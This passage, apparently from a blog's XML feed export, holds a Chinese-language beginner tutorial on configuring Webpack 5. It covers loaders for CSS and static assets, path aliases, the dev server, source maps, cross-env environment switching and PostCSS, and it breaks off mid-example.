class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，引入静态资源模块时，ts 就不会报类型错误的问题了。</p><h2 id="ts-loader-结合-babel-loader"><a href="#ts-loader-结合-babel-loader" class="headerlink" title="ts-loader 结合 babel-loader"></a>ts-loader 结合 babel-loader</h2><p>参考：<a href="https://blog.esunr.site/2023/12/88456067f15c.html">《在 Webpack 中同时使用 ts-loader 和 babel-loader》</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack 操练场 ①：第一个 Webpack 应用</title>
      <link href="/2023/12/da0d8c8ff7b3.html"/>
      <url>/2023/12/da0d8c8ff7b3.html</url>
      
        <content type="html"><![CDATA[<h1 id="第一个-Webpack-应用"><a href="#第一个-Webpack-应用" class="headerlink" title="第一个 Webpack 应用"></a>第一个 Webpack 应用</h1><p>对应代码：<a href="https://github.com/EsunR/webpack-playground/tree/main/templates/html">https://github.com/EsunR/webpack-playground/tree/main/templates/html</a></p><h2 id="安装-webpack"><a href="#安装-webpack" class="headerlink" title="安装 webpack"></a>安装 webpack</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm</span></span><br><span class="line">npm install webpack webpack-cli -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># pnpm（本项目）</span></span><br><span class="line">pnpm install webpack webpack-cli -D</span><br></pre></td></tr></table></figure><ul><li>webpack：webpack 的核心库，提供了 webpack 的核心打包功能</li><li>webpack-cli：webpack 的命令行工具，提供了 webpack 的命令行功能，使得用户可以在命令行中运行 webpack</li></ul><h2 id="定义出入口"><a href="#定义出入口" class="headerlink" title="定义出入口"></a>定义出入口</h2><p>webpack 只需要配置一个入口和一个出口，就已经可以进行基础的打包了，通过以下两个配置可以定义：</p><ul><li>entry 代码入口</li><li>output 配置编译产出</li></ul><p>创建 <code>webpack.config.cjs</code> 文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">  <span class="comment">// 入口</span></span><br><span class="line">  <span class="attr">entry</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src/main.js&#x27;</span>),</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="comment">// 输出路径</span></span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    <span class="comment">// 每次打包前清空 dist 目录</span></span><br><span class="line">    <span class="attr">clean</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>output.path 必须是绝对路径，因此会用到下面的方法来获取绝对路径：</p><ul><li><code>path.resolve()</code> 方法会把一个路径或路径片段的序列解析为一个绝对路径</li><li><code>__dirname</code> 是 node.js 中的一个全局变量（仅 CommonJS 环境），它指向当前执行脚本所在的目录</li></ul><p>因此，<code>path.resolve(__dirname, &quot;./dist&quot;)</code> 代表的就是当前目录下的 dist 目录。</p><blockquote><p>什么是相对路径：相对路径是相对于当前工作目录或者当前文件的路径来表示目标文件的位置。它以当前位置为基准，通过使用特定的路径规则来定位文件。相对路径往往使用相对于当前目录的文件路径，或者相对于当前文件所在目录的路径。例如，在当前目录下的文件A中使用相对路径”../fileB”来引用上级目录下的文件B，即表示A所在目录的上级目录。</p></blockquote><blockquote><p>什么是绝对路径：绝对路径是从文件系统的根目录开始的完整路径名称，它可以准确地定位文件或目录的位置。绝对路径描述的是文件或目录的完整路径，不论当前工作目录是什么，它总是可以指向相同的位置。例如，在UNIX系统上，绝对路径可能是”/usr/local/bin/fileA”，在Windows系统上可能是”C:\Program Files\fileA”。</p></blockquote><p>在终端输入 webpack 指令进行构建：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm</span></span><br><span class="line">npx webpack --config webpack.config.cjs</span><br><span class="line"></span><br><span class="line"><span class="comment"># pnpm（本项目）</span></span><br><span class="line">pnpm <span class="built_in">exec</span> webpack --config webpack.config.cjs</span><br></pre></td></tr></table></figure><p>为了方便使用，我们将执行 webpack 构建的命令行指令写入到 package.json 的 script 中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack --config webpack.config.cjs&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这样就可以通过 <code>npm run build</code> (npm 管理) 或 <code>pnpm build</code> (pnpm 管理) 来执行 webpack 构建了。</p><h2 id="处理-HTML"><a href="#处理-HTML" class="headerlink" title="处理 HTML"></a>处理 HTML</h2><p>使用 <a href="https://github.com/jantimon/html-webpack-plugin">html-webpack-plugin</a> 插件：可以将 JS 引入到 HTML 中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="comment">// 在这里可以填写插件配置，如模板位置、注入 css、js 的方式等</span></span><br><span class="line">      <span class="comment">// 文档：https://github.com/jantimon/html-webpack-plugin#options</span></span><br><span class="line">      <span class="attr">template</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./public/index.html&#x27;</span>),</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="处理-CSS"><a href="#处理-CSS" class="headerlink" title="处理 CSS"></a>处理 CSS</h2><p>loader: webpack 会将所有的资源都作为模块引入，但是引入相对应的资源必须有对应的 loader 才可以。</p><p>处理 css 必须使用以下两个 loader：</p><ul><li>css-loader：只负责编译 css 代码，让 import、require、@import、url 语法生效，成功引入 css 模块，但不负责让 css 生效</li><li>style-loader：将 css-loader 的产出，注入到 html 里</li></ul><p>添加样式处理的 Loader:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">      <span class="comment">// 处理 css 文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="comment">// loader 的执行顺序是从后往前的，因此先执行 css-loader，再执行 style-loader</span></span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>style-loader</code> 会使用 js 将 css 代码注入到 html 里，如果想要将 css 代码单独抽离出来，可以使用 <code>mini-css-extract-plugin</code> 插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MiniCssExtractPlugin</span> = <span class="built_in">require</span>(<span class="string">&#x27;mini-css-extract-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">      <span class="comment">// 处理 css 文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="comment">// &#x27;style-loader&#x27;,</span></span><br><span class="line">          <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// 注意：mini-css-extract-plugin 还包含一个插件需要引入</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(),</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="处理静态资源"><a href="#处理静态资源" class="headerlink" title="处理静态资源"></a>处理静态资源</h2><p>webpack4 需要使用 file-loader 处理静态资源</p><p>但是 webpack5 内置了静态资源 loader，通过指定模块类型为 <code>asset/resource</code> 就可以让 webpack 自动使用静态资源 loader：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">module</span>: &#123;</span><br><span class="line">  <span class="attr">rules</span>: [</span><br><span class="line">    <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">    <span class="comment">// 处理静态资源</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">test</span>: <span class="regexp">/\.(png|svg|jpg|jpeg|gif|mp3|mp4)$/i</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;asset/resource&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="路径别名"><a href="#路径别名" class="headerlink" title="路径别名"></a>路径别名</h2><p>通过 <code>resolve.alias</code> 配置路径别名，让 webpack 识别：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;@&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src&#x27;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但同时，还需要让 vscode 认识配置的路径别名，通过创建一个 <code>jsconfig.json</code> 文件来声明路径别名：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@/*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;./src/*&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="devServer"><a href="#devServer" class="headerlink" title="devServer"></a>devServer</h2><p><a href="https://webpack.docschina.org/configuration/dev-server/">https://webpack.docschina.org/configuration/dev-server/</a></p><p>安装完 <code>webpack-dev-server</code> 后，添加 dev 指令到 package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack serve --config webpack.config.cjs&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack --config webpack.config.cjs&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在终端运行 <code>pnpm dev</code> 就可以启动 dev server 了。</p><h2 id="Source-map-源代码映射"><a href="#Source-map-源代码映射" class="headerlink" title="Source map 源代码映射"></a>Source map 源代码映射</h2><p>如果我们的代码中存在一行报错，那么在没有配置 source map 的情况下，浏览器控制台显示的是编译后的代码，这样我们很难定位到错误的位置。</p><p>如下，我们根据控制台报错信息，定位到的代码是经过编译的，并且不会告诉我们具体文件的第几行出错了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312061421050.png" alt=""></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312061421633.png" alt=""></p><p>因此 webpack 提供了一种生成源代码映射文件的功能，通过这个文件，我们可以将编译后的代码映射到源代码，这样就可以在浏览器控制台中看到源代码了。</p><p>如下，开启了 source map 后，根据控制台的报错信息，定位到的文件是编译前的代码，并且能够告诉我们具体文件的第几行出错了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312061423011.png" alt=""></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312061424398.png" alt=""></p><p>通过 <code>devtool</code> 选项可以开启源代码映射：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">devtool</span>: <span class="string">&#x27;source-map&#x27;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>devtool</code> 的值除了 <code>source-map</code> 之外，还支持以下几个常用选项：</p><ul><li>eval: 每个 module 会封装到 eval 里包裹起来执行，并且会在末尾追加注释 //@ sourceURL.</li><li>source-map: 生成一个 SourceMap 文件.</li><li>hidden-source-map: 和 source-map 一样，但不会在 bundle 末尾追加注释.</li><li>inline-source-map: 生成一个 DataUrl 形式的 SourceMap 文件.</li><li>eval-source-map: 每个 module 会通过 eval() 来执行，并且生成一个 DataUrl 形式的 SourceMap .</li><li>cheap-source-map： 生成一个没有列信息（column-mappings）的 SourceMaps 文件，不包含 loader 的 sourcemap（譬如 babel 的 sourcemap）</li><li>cheap-module-source-map： 生成一个没有列信息（column-mappings）的 SourceMaps 文件，同时 loader 的 sourcemap 也被简化为只包含对应行的。</li></ul><p>不通的选项构建速度是不同的，为了达到一个比较好的构建效果，我们通常建议在开发模式下使用 <code>eval-cheap-module-source-map</code> 来提升构建速度。在生产环境下使用 <code>source-map</code> 来将 source map 文件单独抽离出来，不要让 source map 的代码被打包到源代码中。</p><h2 id="将开发环境和生产环境进行区分"><a href="#将开发环境和生产环境进行区分" class="headerlink" title="将开发环境和生产环境进行区分"></a>将开发环境和生产环境进行区分</h2><p>在编写 webpack 配置时，开发环境和生产环境可能会需要不通的配置。比如在上一节中，我们讲了要在开发环境下使用 <code>eval-cheap-module-source-map</code> 而在生产环境下使用 <code>source-map</code>。通常我们会使用构建时的系统环境变量来区分生产与开发环境。</p><p>我们将 package.json 中的构建脚本进行修改：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line"><span class="deletion">-   &quot;dev&quot;: &quot;webpack serve --config webpack.config.cjs&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;dev&quot;: &quot;export NODE_ENV=development &amp;&amp; webpack serve --config webpack.config.cjs&quot;,</span></span><br><span class="line"><span class="deletion">-   &quot;build&quot;: &quot;webpack --config webpack.config.cjs&quot;</span></span><br><span class="line"><span class="addition">+   &quot;build&quot;: &quot;export NODE_ENV=production &amp;&amp; webpack --config webpack.config.cjs&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>export</code> 指令是 Linux 系统中的一个指令，它可以设置环境变量。比如我们在终端中输入 <code>export TEST_ENV=1</code> 这样就设置了一个系统环境变量，我们可以通过 <code>echo $TEST_ENV</code> 来输出这个环境变量（但是这个环境变量只在当前终端中生效，新建了一个终端后这个环境变量就不存在了）。</p><p>这里我们使用 <code>export NODE_ENV=development</code> 与 <code>export NODE_ENV=production</code> 来为系统设置了一个 <code>NODE_ENV</code> 的环境变量。这意味着，我们在执行 <code>pnpm dev</code> 指令时，系统 <code>NODE_ENV</code> 环境变量为 <code>development</code>，在执行 <code>pnpm build</code> 指令时，系统 <code>NODE_ENV</code> 环境变量为 <code>production</code>。</p><p>但是这里存在一个问题，不同的操作环境可能会有不通的指令，比如在 Linux 系统中使用 <code>export</code> 指令，而在 Windows 系统中使用 <code>set</code> 指令。因此我们需要一个跨平台的指令来设置环境变量，这个指令就是 <a href="https://www.npmjs.com/package/cross-env">cross-env</a>。</p><p>首先安装 cross-env</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install cross-env -D</span><br></pre></td></tr></table></figure><p>然后将 <code>export</code> 指令替换为 <code>cross-env</code> 指令：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line"><span class="deletion">-   &quot;dev&quot;: &quot;export NODE_ENV=development &amp;&amp; webpack serve --config webpack.config.cjs&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;dev&quot;: &quot;cross-env NODE_ENV=development webpack serve --config webpack.config.cjs&quot;,</span></span><br><span class="line"><span class="deletion">-   &quot;build&quot;: &quot;export NODE_ENV=production &amp;&amp; webpack --config webpack.config.cjs&quot;</span></span><br><span class="line"><span class="addition">+   &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack --config webpack.config.cjs&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设定完环境变量后，我们在 webpack 配置文件中使用 <code>process.env.NODE_ENV</code> 来获取当前的环境变量：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isDev = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> !== <span class="string">&#x27;production&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样一来，当 <code>isDev</code> 为 <code>true</code> 时，就代表当前执行的指令是 <code>pnpm dev</code> 也就是开发环境；当 <code>isDev</code> 为 <code>false</code> 时，就代表当前执行的指令是 <code>pnpm build</code> 也就是生产环境。通过这个变量我们就可以为 webpack 配置进行一些差异化的配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isDev = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> !== <span class="string">&#x27;production&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">mode</span>: isDev ? <span class="string">&#x27;development&#x27;</span> : <span class="string">&#x27;production&#x27;</span>, <span class="comment">// 根据环境变量设置 mode</span></span><br><span class="line">  <span class="attr">devtool</span>: isDev ? <span class="string">&#x27;eval-cheap-module-source-map&#x27;</span> : <span class="string">&#x27;source-map&#x27;</span>, <span class="comment">// 根据环境变量设置 devtool</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="comment">// 在开发环境下使用 style-loader 以提升构建速度，生产环境下使用 mini-css-extract-plugin 插件抽离 css</span></span><br><span class="line">          isDev ? <span class="string">&#x27;style-loader&#x27;</span> : <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 其他 webpack 配置</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="进阶：post-css"><a href="#进阶：post-css" class="headerlink" title="进阶：post-css"></a>进阶：post-css</h2><p><a href="https://postcss.org/">PostCSS</a> 是一个用 JavaScript 编写的工具，它可以对 CSS 进行处理、转换和优化，如：</p><ul><li>使用 autoprefixer 为写好的 css 属性自动添加浏览器前缀</li><li>为 css 添加变量、嵌套、函数等特性</li><li>使用一些 css 的新特性，同时为旧浏览器提供降级方案</li></ul><p>首先，需要安装 postcss 提供 postcss 的核心支持，为了让 webpack 能够成功调用 postcss 还需要安装 <a href="https://github.com/webpack-contrib/postcss-loader#getting-started">postcss-loader</a>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install postcss postcss-loader -D</span><br></pre></td></tr></table></figure><p>在 webpack 中添加对应的 loader:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">      <span class="comment">// 处理 css 文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">          <span class="comment">// 添加 post-css loader</span></span><br><span class="line">          <span class="comment">// 注意：postcss 只能处理 css 代码，因此如果添加使用 saas、less 等 css 预处理器，postcss-loader 要放在对应的预处理器 loader 的前面</span></span><br><span class="line">          <span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为了使 postcss 生效，还需要在项目的根目录下创建一个 <code>postcss.config.js</code> 文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// 添加你想使用的插件</span></span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>postcss-loader</code> 会自动读取这个文件，但是目前我们尚未配置任何插件，postcss 并不会正产工作。一般情况下，我们只需要引入 <a href="https://www.npmjs.com/package/postcss-preset-env">postcss-preset-env</a> 即可，这个插件可以将现代 CSS 转换成大多数浏览器都能理解的内容，同时也可以根据目标浏览器或运行时环境添加所需的语法垫片。</p><p>首先，我们要安装这个插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install postcss-preset-env -D</span><br></pre></td></tr></table></figure><p>然后向 <code>postcss.config.js</code> 中添加这个插件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postcssPresetEnv = <span class="built_in">require</span>(<span class="string">&#x27;postcss-preset-env&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">postcssPresetEnv</span>()],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>默认的，<code>postcss-preset-env</code> 提供了缩进语法的特性，我们可以编写带缩进的 css 代码来判断 postcss 是否生效：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hello</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line"></span><br><span class="line">  <span 